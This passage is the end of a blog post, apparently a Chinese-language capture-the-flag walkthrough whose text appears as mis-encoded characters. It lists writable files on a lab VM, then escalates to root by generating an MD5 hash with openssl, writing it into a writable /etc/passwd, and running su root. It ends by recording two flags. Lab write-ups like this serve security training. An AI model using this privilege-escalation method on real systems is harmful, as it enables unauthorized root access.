href="mailto:&#x75;&#x73;&#x65;&#114;&#64;&#x31;&#x30;&#48;&#48;&#x2e;&#x73;&#x65;&#x72;&#118;&#105;&#x63;&#x65;">&#x75;&#x73;&#x65;&#114;&#64;&#x31;&#x30;&#48;&#48;&#x2e;&#x73;&#x65;&#x72;&#118;&#105;&#x63;&#x65;</a>&#x2F;cgroup.subtree_control<br>&#x2F;run&#x2F;dbus&#x2F;system_bus_socket<br>&#x2F;run&#x2F;user&#x2F;1000<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;user&#x2F;1000&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;shm<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;dev-log<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;syslog<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;socket<br>&#x2F;run&#x2F;systemd&#x2F;journal&#x2F;stdout<br>&#x2F;run&#x2F;systemd&#x2F;private<br>&#x2F;run&#x2F;systemd&#x2F;notify<br>&#x2F;run&#x2F;lock<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2fseq<br>&#x2F;run&#x2F;udev&#x2F;static_node-tags&#x2F;uaccess&#x2F;snd\x2ftimer<br>&#x2F;home&#x2F;mowree<br>&#x2F;home&#x2F;mowree&#x2F;.profile<br>&#x2F;home&#x2F;mowree&#x2F;.bash_history<br>&#x2F;home&#x2F;mowree&#x2F;.ssh<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;id_rsa<br>&#x2F;home&#x2F;mowree&#x2F;.ssh&#x2F;authorized_keys<br>&#x2F;home&#x2F;mowree&#x2F;.bashrc<br>&#x2F;home&#x2F;mowree&#x2F;.bash_logout<br>&#x2F;home&#x2F;mowree&#x2F;.local<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share<br>&#x2F;home&#x2F;mowree&#x2F;.local&#x2F;share&#x2F;nano<br><strong>&#x2F;etc&#x2F;passwd</strong>                     #å’¦â“<br>&#x2F;dev&#x2F;dvd<br>&#x2F;dev&#x2F;cdrom<br>&#x2F;dev&#x2F;fb0<br>&#x2F;dev&#x2F;dri&#x2F;by-path&#x2F;pci-0000:00:02.0-card<br>&#x2F;dev&#x2F;dri&#x2F;card0<br>&#x2F;dev&#x2F;sg1<br>&#x2F;dev&#x2F;snd&#x2F;seq<br>&#x2F;dev&#x2F;snd&#x2F;timer<br>&#x2F;dev&#x2F;net&#x2F;tun<br>&#x2F;dev&#x2F;fuse<br>&#x2F;dev&#x2F;log<br>&#x2F;dev&#x2F;mqueue<br>&#x2F;dev&#x2F;shm<br>&#x2F;dev&#x2F;disk&#x2F;by-id&#x2F;ata-VBOX_CD-ROM_VB2-01700376<br>&#x2F;dev&#x2F;disk&#x2F;by-path&#x2F;pci-0000:00:01.1-ata-2<br>&#x2F;dev&#x2F;block&#x2F;11:0<br>&#x2F;dev&#x2F;sr0<br>&#x2F;dev&#x2F;char&#x2F;29:0<br>&#x2F;dev&#x2F;char&#x2F;226:0<br>&#x2F;dev&#x2F;char&#x2F;21:1<br>&#x2F;dev&#x2F;char&#x2F;5:0<br>&#x2F;dev&#x2F;char&#x2F;5:2<br>&#x2F;dev&#x2F;char&#x2F;1:5<br>&#x2F;dev&#x2F;char&#x2F;1:9<br>&#x2F;dev&#x2F;char&#x2F;1:8<br>&#x2F;dev&#x2F;char&#x2F;1:3<br>&#x2F;dev&#x2F;char&#x2F;1:7<br>&#x2F;dev&#x2F;stderr<br>&#x2F;dev&#x2F;stdout<br>&#x2F;dev&#x2F;stdin<br>&#x2F;dev&#x2F;fd<br>&#x2F;dev&#x2F;pts&#x2F;0<br>&#x2F;dev&#x2F;ptmx<br>&#x2F;dev&#x2F;tty<br>&#x2F;dev&#x2F;urandom<br>&#x2F;dev&#x2F;random<br>&#x2F;dev&#x2F;full<br>&#x2F;dev&#x2F;zero<br>&#x2F;dev&#x2F;null<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;sendsigs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootmisc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountdevsubfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rmnologin.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;motd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;reboot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rcS.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hostname.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;rc.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd-single.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountall-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;stop-bootlogd.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;cryptdisks-early.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;umountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountkernfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;halt.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkroot-bootclean.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;checkfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;bootlogs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;mountnfs.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;hwclock.service<br>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;x11-common.service<br>&#x2F;var&#x2F;tmp<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions<br>&#x2F;var&#x2F;lock</p>
</blockquote>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209002251743.png" alt="image-20211209002251743"></p>
<p>å‘ç°&#x2F;etc&#x2F;passwdç«Ÿç„¶æ˜¯å¯å†™çš„</p>
<p>è¿™é‡Œé€šè¿‡æŸ¥çœ‹kaliæœ¬æœºçš„&#x2F;etc&#x2F;passwdæƒé™ å¯¹æ¯”ä¸€ä¸‹æ­¤å¤„çš„å¼‚å¸¸</p>
<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209002654265.png" alt="image-20211209002654265"></p>
<p>è€Œç›®æ ‡é¶æœºä¸Šçš„ç”¨æˆ·mowreeå±…ç„¶å…·æœ‰&#x2F;etc&#x2F;passwdæ–‡ä»¶çš„å†™æƒé™ çªç ´çš„ä¸€çº¿æ›™å…‰ğŸŒ</p>
<p>linuxç³»ç»Ÿå†…çš„ç”¨æˆ·åå­˜æ”¾åœ¨&#x2F;etc&#x2F;passwdæ–‡ä»¶å†…ï¼Œå¯†ç å­˜æ”¾åœ¨&#x2F;etc&#x2F;shadowæ–‡ä»¶å†…ï¼Œä½†æ˜¯&#x2F;etc&#x2F;shadowæ–‡ä»¶æ²¡æœ‰æƒé™ï¼Œæ‰€ä»¥ä¸‹ä¸€æ­¥çš„æ€è·¯æ˜¯å€ŸåŠ©å·²æœ‰çš„å¯¹&#x2F;etc&#x2F;passwdçš„å†™æƒé™ï¼Œèƒ½å¦ä¿®æ”¹rootå¯†ç ï¼Ÿ</p>
<p>ç»™rootè´¦å·ç”Ÿæˆå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1   #-1 md5åŠ å¯†ç®—æ³•ä»£å·      è®¾å®šå¯†ç 123456</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209004130358.png" alt="image-20211209004130358"></p>
<p>å¤åˆ¶å¯†æ–‡$1$oSFKywfc$hOVlE.SmqSlT5aAhNHQsS1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/passwd        #ä¿®æ”¹rootç”¨æˆ·çš„å¯†ç </span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209005157113.png" alt="image-20211209005157113"></p>
<p>æ›´æ”¹æˆåŠŸå</p>
<p>åˆ‡æ¢è‡³rootç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>

<p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211209005326964.png" alt="image-20211209005326964"></p>
<p>ææƒæˆåŠŸï¼Œæ‹¿åˆ°ç¬¬äºŒä¸ªflag 36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
<p>ğŸ†flag1</p>
<blockquote>
<p>56Rbp0soobpzWSVzKh9YOvzGLgtPZQ</p>
</blockquote>
<p>ğŸ†flag2</p>
<blockquote>
<p>36QtXfdJWvdC0VavlPIApUbDlqTsBM</p>
</blockquote>
</div></article></div></main><footer><div class="paginator"><a href="/2022/02/14/week7/" class="prev">PREV</a><a href="/2022/01/05/week5/" class="next">NEXT</a></div><div class="copyright"><p>Â© 2021 - 2022 <a href="http://example.com">Patrik</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/pinggod/hexo-theme-apollo" target="_blank">hexo-theme-apollo</a>.</p></div></footer></div><script async src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script></body></html>